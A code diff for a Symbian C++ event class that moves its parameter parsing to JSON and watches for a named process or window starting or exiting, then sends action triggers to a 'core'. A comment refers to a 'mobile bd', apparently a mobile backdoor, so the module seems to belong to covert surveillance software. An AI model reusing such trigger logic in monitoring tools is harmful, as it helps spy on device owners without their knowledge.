@@ -9,6 +9,7 @@
 #include <HT\processes.h>
 #include <APGWGNAM.H>
 
+#include "Json.h"
 	
 CEventProcess::CEventProcess(TUint32 aTriggerId) :
 	CAbstractEvent(EEvent_Process, aTriggerId),iSecondsInterv(3)
@@ -16,11 +17,10 @@ CEventProcess::CEventProcess(TUint32 aTriggerId) :
 	// No implementation required
 	}
 
-CEventProcess::~CEventProcess()
+CEventProcess::~CEventProcess() 
 	{
 	__FLOG(_L("Destructor"));
 	delete iTimer;
-	delete iName;
 	iWsSession.Close();
 	__FLOG(_L("End Destructor"));
 	__FLOG_CLOSE;
@@ -48,17 +48,62 @@ void CEventProcess::ConstructL(const TDesC8& params)
 	__FLOG_OPEN_ID("HT", "EventProcess.txt");
 	__FLOG(_L("-------------"));
 		
-	TUint8* ptr = (TUint8 *)iParams.Ptr();
-	Mem::Copy(&iProcessParams, iParams.Ptr(), sizeof(TProcessStruct));
-	ptr += sizeof(TProcessStruct);
+	RBuf paramsBuf;
 	
-	iName = HBufC::NewL(iProcessParams.iNameLen);
-	if (iProcessParams.iNameLen > 0)
+	TInt err = paramsBuf.Create(2*params.Size());
+	if(err == KErrNone)
 		{
-		TUint8 totChars = (iProcessParams.iNameLen-1) / 2;  //TODO: verify -1
-		TPtr16 ptrNum((TUint16 *) ptr, totChars, totChars);
-		iName->Des().Append(ptrNum);  
+		paramsBuf.Copy(params);
 		}
+	else
+		{
+		//TODO: not enough memory
+		}
+	
+	paramsBuf.CleanupClosePushL();
+	CJsonBuilder* jsonBuilder = CJsonBuilder::NewL();
+	CleanupStack::PushL(jsonBuilder);
+	jsonBuilder->BuildFromJsonStringL(paramsBuf);
+	CJsonObject* rootObject;
+	jsonBuilder->GetDocumentObject(rootObject);
+	if(rootObject)
+		{
+		CleanupStack::PushL(rootObject);
+		//retrieve process name
+		rootObject->GetStringL(_L("process"),iProcessParams.iName);
+		//retrieve if window or process name, for mobile bd it's useless
+		TBool window = EFalse;
+		rootObject->GetBoolL(_L("window"),window);
+		if(window)
+			iProcessParams.iType = 1;
+		else
+			iProcessParams.iType = 0;
+		//retrieve exit action
+		if(rootObject->Find(_L("end")) != KErrNotFound)
+			{
+			rootObject->GetIntL(_L("end"),iProcessParams.iExitAction);
+			}
+		else
+			iProcessParams.iExitAction = -1;
+		
+		//retrieve repeat action
+		if(rootObject->Find(_L("repeat")) != KErrNotFound)
+			{
+			rootObject->GetIntL(_L("repeat"),iProcessParams.iRepeatAction);
+			rootObject->GetIntL(_L("iter"),iProcessParams.iIter);
+			rootObject->GetIntL(_L("delay"),iProcessParams.iDelay);
+			}
+		else
+			{
+			iProcessParams.iRepeatAction = -1;
+			iProcessParams.iIter = 0;
+			iProcessParams.iDelay = 0;
+			}
+		CleanupStack::PopAndDestroy(rootObject);
+		}
+
+	CleanupStack::PopAndDestroy(jsonBuilder);
+	CleanupStack::PopAndDestroy(&paramsBuf);
 	
 	iTimer = CTimeOutTimer::NewL(*this);
 	
@@ -85,7 +130,7 @@ void CEventProcess::StartEventL()
 				{
 				continue;
 			    }
-			if(ph.Name().MatchC(*iName) != KErrNotFound)
+			if(ph.Name().MatchC(iProcessParams.iName) != KErrNotFound)
 				{
 				++iOldCount;
 				}
@@ -110,7 +155,7 @@ void CEventProcess::StartEventL()
 			wgName->ConstructFromWgIdL(((*windowGroupIds)[i]));
 			windowName.Copy(wgName->Caption());
 			//iWsSession.GetWindowGroupNameFromIdentifier((*windowGroupIds)[i],windowName);
-			if(windowName.MatchC(*iName) != KErrNotFound)
+			if(windowName.MatchC(iProcessParams.iName) != KErrNotFound)
 				{
 				++iOldCount;
 				}
@@ -155,7 +200,7 @@ void CEventProcess::TimerExpiredL(TAny* /*src*/)
 				{
 				continue;
 			    }
-			if(ph.Name().MatchC(*iName) != KErrNotFound)
+			if(ph.Name().MatchC(iProcessParams.iName) != KErrNotFound)
 				{
 				++iNewCount;
 				}
@@ -181,7 +226,7 @@ void CEventProcess::TimerExpiredL(TAny* /*src*/)
 			wgName->ConstructFromWgIdL(((*windowGroupIds)[i]));
 			windowName.Copy(wgName->Caption());
 			//iWsSession.GetWindowGroupNameFromIdentifier((*windowGroupIds)[i],windowName);
-			if(windowName.MatchC(*iName) != KErrNotFound)
+			if(windowName.MatchC(iProcessParams.iName) != KErrNotFound)
 				{
 				++iNewCount;
 				}
@@ -196,7 +241,8 @@ void CEventProcess::TimerExpiredL(TAny* /*src*/)
 		SendActionTriggerToCoreL();
 	else if((iOldCount>0) && (iNewCount == 0))   //(old list count > 0)  && (new list count = 0) => trigger exit action
 		{
-		if (iProcessParams.iExitAction != 0xFFFFFFFF)						
+		//if (iProcessParams.iExitAction != 0xFFFFFFFF)
+		if(iProcessParams.iExitAction != -1)
 			SendActionTriggerToCoreL(iProcessParams.iExitAction);						
 		}
 			
